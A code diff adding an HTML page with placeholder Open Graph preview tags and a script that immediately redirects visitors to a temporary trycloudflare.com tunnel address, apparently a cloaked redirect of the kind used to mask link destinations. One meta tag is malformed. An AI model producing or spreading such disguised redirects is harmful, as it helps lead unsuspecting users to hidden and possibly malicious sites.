@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Open Graph Tags -->
+    <meta property="og:title" content="عنوان الصفحة هنا">
+    <meta property="og:description" content="وصف الصفحة هنا">
+    <meta property="og:url" content="https://your-site.com">
+    <meta property="og:type" content="website"
+
+    <title>Redirecting...</title>
+
+    <!-- Redirect -->
+    <script>
+        window.location.href = "https://pioneer-instrumental-forward-windsor.trycloudflare.com";
+    </script>
+</head>
+<body>
+    <p>Redirecting...</p>
+</body>
+</html>
